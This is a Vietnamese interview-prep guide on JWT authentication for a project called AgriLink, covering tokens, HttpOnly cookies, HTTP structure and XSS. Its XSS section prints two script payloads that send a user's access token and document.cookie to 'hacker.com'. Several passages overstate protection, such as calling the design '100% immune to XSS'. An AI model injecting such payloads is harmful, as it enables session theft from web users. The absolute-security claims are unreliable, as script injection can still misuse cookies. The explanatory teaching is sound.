# 🔐 KIẾN TRÚC BẢO MẬT JWT: NHỮNG CÂU HỎI "SẤY KHÔ" VÀ CÁCH ĐÁP TRẢ (DỰ ÁN AGRILINK)

JWT (JSON Web Token) là mảng bị xoáy kinh khủng nhất khi phỏng vấn Backend/Fullstack. Nhà phỏng vấn sẽ không hỏi lý thuyết rập khuôn, mà họ sẽ "soi" trực tiếp vào lỗ hổng báo mật. Gặp những người phỏng vấn "cáo già", họ sẽ vặn vẹo cấu trúc gốc rễ của JWT và Giao thức HTTP.

Tài liệu này dựa trên 100% dòng code thực tế của dự án AgriLink để giúp bạn hùng biện cực kỳ tự tin.

---

## 🛑 BÀI TOÁN SỐ 1: BẢN CHẤT JWT CHỨA NHỮNG GÌ? (MỔ XẺ CẤU TRÚC LÕI)

**Câu hỏi: Em bảo em dùng JWT, vậy em có biết cấu tạo cái dải mã lằng nhằng đó gồm những phần nào không? Cái Header của JWT chứa cái gì?**

**Trả lời (Cực sâu):**
"Dạ, JWT bản chất là 1 chuỗi String được chia làm 3 khúc, ngăn cách nhau bởi 2 dấu chấm `(.)`. Nó có cấu trúc là **`Header.Payload.Signature`**, tất cả đều được mã hóa bằng chuẩn `Base64Url`. Cụ thể:

1. **Khúc ngọn - Header (JWT Header):** Không chứa data người dùng! Nó chỉ chứa 2 thông tin hệ thống định dạng JSON: Thuật toán mã hóa chữ ký (Ví dụ `{"alg": "HS256"}`) và Loại token (`{"typ": "JWT"}`). 
2. **Khúc thân - Payload (Mảnh vỡ Dữ liệu):** Chứa các thông tin người dùng được định nghĩa là "Claims" (Khẳng định). Trong .NET của em, nó chứa cái `ClaimTypes.NameIdentifier` (Nghĩa là UserId/GUID), cùng với các thông số sống còn như thời gian phát hành (`iat`) và hạn sử dụng thẻ (`exp` - thời hạn 30 phút của Access Token). *Khúc này ai mổ ra cũng đọc được, nên tuyệt đối em KHÔNG BỎ Mật khẩu hay Passcode vào đây.*
3. **Khúc đuôi - Signature (Chữ ký số):** Đây là **Lõi bảo mật**. Nó được máy chủ BE băm bằng thuật toán `HMAC-SHA256`. Công thức cực gắt: Băm `[Header + Payload + SecretKey của BE]`. Bất kỳ ai sửa 1 chữ số trong cái `Payload` (Ví dụ sửa Hạn dùng từ 30 phút thành 100 năm), thì cái chuỗi băm lúc sau ghép lại sẽ lòi ra LỆCH BIÊN ĐỘ với cái Signature gốc. Máy chủ phát hiện ra Hàng Giả ngay lập tức!".

---

## 🛑 BÀI TOÁN SỐ 2: JWT ĐÍNH VÀO CODE VÀ HTTP HEADER NHƯ THẾ NÀO?

**Câu hỏi: Lúc Client gọi API cần xác thực, làm sao nó móc JWT gửi lên BE? Gắn ở Body hay URL? Nó mang hình hài như thế nào trên con đường mạng?**

**Trả lời (Hiểu thấu HTTP Protocol):**
"Dạ nguyên tắc tuân chuẩn của RESTful (và chuẩn OAuth2 quy định) là **KHÔNG nhét Token đính vào URL hay Body JSON**. Nó phải được giấu trên nhãn thư, tức là cái **HTTP REQUEST HEADER**.

Trong dự án AgriLink, em dùng cơ chế Interceptor của thằng Axios (`apiClient.js` dòng số 41). Hễ trước khi gói tin Request rời bến Frontend, Javascript sẽ chọc ổ cứng (`localStorage.getItem('accessToken')`) để móc thẻ Access Token ra.
Sau đó nó ép gài thẻ này vào Key có tên bắt buộc (Quốc tế) là **`Authorization`**.
Cấu trúc String đi theo định dạng chuẩn: **`Bearer <Khoảng trắng> <Chuỗi_Token_JWT>`**.

(Ví dụ: `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR...`)

Tín hiệu này bay sang con BE .NET Core. Ở cổng BE, Middleware `[Authorize]` của bộ thư viện `AddJwtBearer` đã đứng rình sẵn. Thấy nhãn thư `Authorization` bắt đầu bằng chữ "Bearer ", nó dùng lưỡi lam cắt lấy phần đuôi mã băm, vứt khóa `SecretKey` vào giải mã để định danh cái Request đó."

---

## 🛑 BÀI TOÁN SỐ 3: BACKEND TRẢ CHÌA KHÓA CHO FRONTEND DƯỚI HÌNH HÀI GÌ?

**Câu hỏi: Vậy lúc Đăng nhập thành công, BE trả cục JWT xuống, làm sao thằng FE nhận diện được và hiểu cái khối dữ liệu đó? FE có phải cạy cái JWT ra để lấy tên và Email hiển thị không?**

**Trả lời (Nắm vững luồng trả JSON BE $\rightarrow$ FE):**
"Dạ cái bước Sign JWT và trả về, FE không cần tốn công bóc JWT ra đọc (Decode) nhọc nhằn, mà là Backend quy hoạch ngay từ cấu trúc JSON Response.

Trong file `AuthController.cs` (hàm `Login`), sau khi băm AccessToken xong, BE em đóng gói trả về gói Body JSON Response theo format cực kỳ gọn:
```json
{
  "success": true,
  "message": "Đăng nhập thành công",
  "data": {
     "user": {
         "id": "123-abc",
         "fullName": "Duy Hoàng",
         "role": "Admin"
     },
     "token": {
         "accessToken": "eyJhbGciOi..."
     }
  }
}
```
*(Lưu ý như em phân tích phía trên: Cùng khoảnh khắc này, BE tự hạ cờ nhồi cái `RefreshToken` ngầm vào Cookie `HttpOnly=true` của trình duyệt Chrome, và code tự xóa trắng nó khỏi cái Body JSON `token.RefreshToken = ""` để ẩn danh hoàn toàn khỏi tầm nhìn Javascript).*

Khi gói thư Response lọt xuống trình duyệt:
1. Thằng ReactJS đọc file JSON. Nó nhặt cục `user` thả vào Store (Context/Redux) để hiển thị Hình đại diện, Tên tuổi trên góc màn hình luôn mà không cần phải dùng thư viện Decode bóc JWT nặng nề.
2. Nó nhặt cục `token.accessToken` ném thẳng vô trong kho `localStorage`. Chờ lần gửi Request API tiếp theo thì lôi ra đè lên gói Header (Như em giải thích ở Bài toán 2)."

---

## 🛑 BÀI TOÁN SỐ 4: VÌ SAO JWT TỒN TẠI TỚI 2 LOẠI TOKEN (ACCESS & REFRESH)
Thường thì người mới bắt đầu chỉ làm 1 token duy nhất (Access Token). Nhưng đồ án của em làm chuẩn công nghiệp là phải tách 2 cái:
* **Access Token:** Thẻ qua cổng ngắn hạn (Tồn tại khoảng 30 phút). 
* **Refresh Token:** Tấm thẻ bài gia hạn (Tồn tại 7 ngày). 
* **Lý do:** Lỡ bị nghe lén (Sniffing) rớt cắp cái Access Token đang gửi trong Header, thì Hacker cũng chỉ tung hoành được dưới 30 phút. Hết giờ bắt buộc xin cấp thẻ mới bằng `Refresh Token`. Mà chớ trêu là Hacker không có cách nào đánh cắp được `Refresh Token` do nó nằm sâu thẳm bảo mật trong HttpOnly Cookie dưới hầm trình duyệt!. Vòng kiềng bất khả xâm phạm.

---

## 🛑 BÀI TOÁN SỐ 5: VÒNG LẶP CỨU SỐNG - REFRESH TOKEN GIAO TIẾP RA SAO NẾU FE KHÔNG TRẠM TỚI ĐƯỢC?

**Câu hỏi: Chốt lại, FE không thò tay lấy Cookie được, vậy JS lấy gì để cưa lại hạn 30 phút?**

"Đây là điểm ăn tiền nhất của cơ chế HTTP-Only. Mặc dù JS mắt mù lòa không chọc thẳng được vô Cookie, nhưng Trình duyệt Google Chrome thì lại làm được.
Tại `apiClient.js`, khi Axios giật lệnh gọi POST `/auth/refresh`, em cài cái cờ lệnh siêu cấp: **`withCredentials: true`**.

Bất thình lình, cái thằng Trình Duyệt tẩu tán cái Cookie (chứa Refresh Token) ngầm đi kèm luôn chung cái bó Request đó. Backend đút ống dò Header ra hút, nhẹ nhàng đọc được Refresh Token:  `var refreshToken = Request.Cookies["refreshToken"];`. Xanh sạch và miễn nhiễm XSS 100%!".

---

## 🛑 BÀI TOÁN SỐ 6: PARADOX KHỦNG KHIẾP - BẢN CHẤT CỦA HTTP VÀ HTTP-ONLY COOKIE

**Câu hỏi sấy (Đỉnh điểm vặn vẹo):** 
* "Cấu trúc HTTP Request/Response gồm những phần nào?"
* "HttpOnly Cookie trên bờ mạng rốt cuộc nó mang hình dáng gì?"
* **Câu chốt hạ:** "Nếu em khảng định Code ReactJS (Frontend) **BỊ MÙ**, tuyệt đối không thể truy xuất đọc được RefreshToken từ HttpOnly Cookie. Vậy thì LÀM CÁCH NÀO lúc AccessToken hết hạn, cái code JS đó lại có thể cầm cái RefreshToken đó GỬI lên cho Server lúc gọi lệnh `/refresh` để xin cấp thẻ mới? Chẳng phải là vô lý sao?"

**Trả lời (Tuyệt kỹ đỉnh cao kiến trúc mạng):**

**Vế 1 & 2: Cấu trúc HTTP và HttpOnly là gì?**
* "Dạ cấu trúc của một gói tin HTTP cơ bản chia làm 3 phần như 1 phong bì thư: 
  👉 `Dòng trạng thái (Method + URL)` $\rightarrow$ `Headers (Các nhãn dán, tem kiểm duyệt ngoài phong bì)` $\rightarrow$ `Body (Khối dữ liệu JSON giấu mướt ở lòng thư)`.
* **HttpOnly Cookie** thực ra không phải là vật chất ma pháp nào. Nó chỉ là 1 câu lệnh bằng chữ được Backend viết bằng mực đỏ dán lên cái **Headers** khi trả về bảo Trình duyệt.
  (Cụ thể bên file `AuthController.cs` BE của em chèn dán câu này: `Set-Cookie: refreshToken=eyJhb...; HttpOnly; Path=/`)

Sức mạnh nằm ở cái chữ `HttpOnly`. Một khi Trình duyệt (Chrome/Safari) đọc được cái đuôi chữ ký này, nó sẽ bật **Chế độ Két sắt**. Nó tự lấy dải mã refreshToken cất riêng vào kho mật, và **Chặn đứng, Cách ly hoàn toàn mọi thủ đoạn của Javascript** (Kể cả code React của mình, hay mã độc XSS của Hacker) gõ lệnh `document.cookie` để cố tình coi lén dải mã đó!

**Vế 3: Cách giải mã Nghịch lý (Paradox - Chống vặn vẹo cực mạnh)**
*"Tại sao Javascript FE bị cách ly KHÔNG ĐỌC ĐƯỢC Cookie, mà vẫn GỬI ĐƯỢC Cookie lên Backend lúc dập Refresh?"*

Đây là lúc dội gáo nước lạnh khẳng định đẳng cấp 10 điểm:
"Dạ vì thưa anh/chị, **người nhét cái thẻ RefreshToken vào bao thư gửi đi KHÔNG PHẢI LÀ FILE JAVASCRIPT, MÀ LÀ DO CÁI TRÌNH DUYỆT CHROME làm chuyện đó thay cho JS!**"

Trong file `apiClient.js`, khi AccessToken hết hạn 30 phút, code React của em chỉ ngây ngô gọi 1 cái lệnh hàm Axios rỗng tuếch, bên trong không hề có chứa mã Token:
👉 `axios.post('/auth/refresh', {}, { withCredentials: true })`

Khoảnh khắc cái gói tin lệnh rời khỏi mã Javascript, **Nó bị Trình duyệt Chrome chặn lại ở cửa khẩu**. 
Chrome soi thấy có cái cờ uỷ nhiệm `withCredentials: true` mà em viết, lại thấy gói tin chuẩn bị bay về đúng cái nhà `duyhoang.io.vn` (Nơi sinh ra Cookie ngày trước). 
Thế là Chrome lặng lẽ **Mở két sắt**, tự lôi cái RefreshToken hồi xưa tàng hình ra. Trình duyệt **TỰ ĐỘNG chắp vá thêm** vô cái phong bì Header của Request thành:
👉 `Cookie: refreshToken=eyJhb...`

Rồi nó sút gói thư bay vèo về phía Backend. Backend thò tay vào Request Header bốc ra nguyên khối ngon ơ. 

Nói tóm lại: **Javascript ở FE chỉ đóng vai "thằng mù ra lệnh chạy rỗng". Còn việc nhét tàng hình Refresh Token từ két sắt gắn vào gói thư là Cơ chế tự động của Trình Duyệt đứng ra lo liệu ở Layer mạng lưới.** Từ đó, Hacker có lôi 100 loại mã độc ra mò mẫm ở mặt tiền Javascript cũng không bao giờ ăn cắp được chuỗi Token gốc đó để đánh tráo! Một vòng bảo mật cực kỳ hoàn hảo!".

---

## 🛑 BÀI TOÁN SỐ 7: MINH HỌA THỰC CHIẾN - HACKER DÙNG XSS TẤN CÔNG THẾ NÀO VÀ TẤM KHIÊN HTTP-ONLY CHỐNG ĐỠ RA SAO?

**Câu hỏi sấy (Đòi hỏi show mảng miếng tấn công xưng hùng xưng bá):**
* "Em hay lôi chữ XSS ra khè, vậy em giải thích XSS (Cross-Site Scripting) cụ thể là nó làm cái trò gì?"
* "Minh họa cho anh thấy một cái hình hài thô thiển của gói tin HTTP chứa Cookie và cách Hacker viết Code ăn cắp xem nào?"

**Trả lời (Vạch trần phương thức Hacker):**

**1. Hình hài thô thiển của Giao thức HTTP 1.1**
Khi không có giao diện, một gói tin gửi đi bằng chuẩn HTTP thô thiển sẽ trông như vầy. Trình duyệt chính là kẻ âm thầm ráp nối dòng chữ `Cookie:` vào đây:
```http
POST /api/auth/refresh HTTP/1.1    <-- DÒNG TRẠNG THÁI (Method + URL)
Host: duyhoang.io.vn               <-- HEADERS
Content-Type: application/json     <-- HEADERS
Cookie: refreshToken=eyJhbGci...   <-- TRÌNH DUYỆT TỰ CHÈN HEADER NÀY TỪ KÉT SẮT

{ "dummy_data": "none" }           <-- BODY JSON (Từ JS gọi lên)
```

**2. Các dạng tấn công XSS (Cross-Site Scripting) khét tiếng**
XSS xảy ra khi Hacker lừa Trang Web của em tự chạy ĐOẠN CODE JAVASCRIPT CỦA CHÚNG NÓ trên máy của người dùng khác. 
* **Stored XSS (Nguy hiểm nhất):** Hacker vào mục "Viết Bình luận/Đánh giá" của AgriLink. Thay vì gõ chữ bình thường, nó gõ một đoạn thẻ Javascript:
  `<script> fetch('http://hacker.com/steal?token=' + localStorage.getItem('accessToken')) </script>`
  FE ngây thơ lưu đoạn Text này xuống Database. Ngày hôm sau Admin vào xem đánh giá nhân công, Trình duyệt của Admin tải đoạn bình luận này về và NHẦM TƯỞNG nó là Code của hệ thống. Thế là nó tự động chạy!
* **Hậu quả lủng LocalStorage:** Lúc đoạn mã kia chạy, lệnh `localStorage.getItem` hoạt động trơn tru. Toàn bộ `AccessToken` của Admin bị copy và bắn thẳng về Server thằng Hacker. Hacker có AccessToken $\rightarrow$ Làm mưa làm gió 30 phút!

**3. Tại sao HttpOnly xưng vương trong thế trận này?**
Như em đã nói, do AccessToken bị lấy cắp, Hacker có 30 phút rên rỉ. Hết 30 phút, cái Token đó chết.
Hacker nổi điên, chúng muốn ăn cắp luôn cái thẻ vô cực `RefreshToken` để trụ lại vĩnh viễn trong hệ thống. Chúng biết thẻ đó lưu trong Cookie.
Thế là chúng tải lại trang Web bình luận, viết một đoạn XSS cực mạnh khác:
`<script> fetch('http://hacker.com/steal-cookie?data=' + document.cookie) </script>`

**Nhưng ác mộng của Hacker bắt đầu:**
Trình duyệt chặn đứng lại và thông báo: *"Mọi Cookie mang nhãn HTTP-ONLY bị trả về giá trị NULL (hoặc rỗng) khi gọi lệnh `document.cookie`"*.
Gói thư bay đến tay Hacker chỉ có dòng chữ: `http://hacker.com/steal-cookie?data=null`. 
Hacker hoàn toàn mù tịt về chuỗi JWT Refresh Token. Không có Refresh, Hacker không thể lên Backend xin gia hạn thẻ $\rightarrow$ Sau 30 phút, Hacker bị hệ thống đá văng tự động. Hệ thống AgriLink vẫn an toàn tuyệt đối mà không cần can thiệp tay! Tấm khiên chắn đã gồng gánh toàn bộ sức tàn phá của XSS!

---

## 🛑 BÀI TOÁN SỐ 8: CHUẨN HÓA THUẬT NGỮ CẤU TRÚC HTTP & URL (CHỐNG MẤT ĐIỂM OAN MẠNG CƠ BẢN)

Rất nhiều Lập trình viên bị vặn hỏi: "Cấu trúc Giao thức HTTP gồm gì?" lại đi trả lời là "Gồm URL, Protocol, Domain...". Chỗ này gây mất điểm chí mạng vì nhầm lẫn giữa KHÁI NIỆM MẠNG (HTTP) và ĐỊA CHỈ TRANG WEB (URL). Hãy phân biệt rạch ròi 2 khái niệm sau:

**1. URL (Uniform Resource Locator) - Địa chỉ nhà**
URL chỉ là **1 dòng chữ đơn sơ** để chỉ đường cho trình duyệt biết Server nằm đâu. Nó hoàn toàn KHÔNG PHẢI là giao thức HTTP. Cấu trúc URL (`https://duyhoang.io.vn/api/auth?status=0`) gồm:
* `https://`: Gọi là  **Protocol / Scheme** (Giao thức truyền).
* `duyhoang.io.vn`: Gọi là **Domain / Hostname** (Tên miền).
* `/api/auth`: Gọi là **Path** (Đường dẫn).
* `?status=0`: Gọi là **Query String** (Tham số truy vấn).

**2. HTTP REQUEST / RESPONSE - Chiếc xe tải chỏ bức thư**
Khi trình duyệt đọc cái URL ở trên, nó sẽ nổ máy tạo ra 1 "Gói tin HTTP". Cấu trúc HTTP KHÔNG PHẢI LÀ DOMAIN, cấu trúc HTTP phải trả lời là **3 PHẦN CỦA GÓI TIN**:

* **Phần 1: Request Line (Dòng Yêu cầu):** Chứa Hành động `(GET/POST/PUT)` + Đường dẫn `(Path)` + Phiên bản công nghệ `(HTTP/1.1)`. (Ví dụ: `POST /api/auth HTTP/1.1`). 
* **Phần 2: Headers (Phần đầu thư):** Chứa các thông số khai báo hệ thống của Trình duyệt và Server. Thằng **Domain** sẽ nằm ở một dòng Header mang tên là `Host: duyhoang.io.vn`. Thằng **Token** nằm ở nhãn `Authorization: Bearer...`. Và **Cookie** nằm ở đây. Giữa các dòng Header tụi nó xuống dòng bằng cấu trúc ký tự `\r\n`.
* **Dòng Trống (Blank Line):** Bất di bất dịch của chuẩn quốc tế, báo hiệu hết Header.
* **Phần 3: Body (Thân thư dữ liệu):** Thường là chuỗi JSON mà Frontend truyền lên (Ví dụ: `{ "username": "admin" }`).

**Cách đối đáp khi bị hỏi vặn lại:**
"Dạ hôm trước do tâm lý em nói nhầm URL thành HTTP. 
Thực tế **Domain chỉ là một thông số nhỏ (thẻ Host)** nằm lọt thỏm bên trong phần **Headers** của toàn bộ gói tin HTTP. Gói tin HTTP chuẩn chỉnh phải chia làm 3 tầng: Dòng khai báo phương thức (Status Line), Các thẻ mô tả (Headers), và Thạch nhũ dữ liệu (Body JSON) anh ạ!".
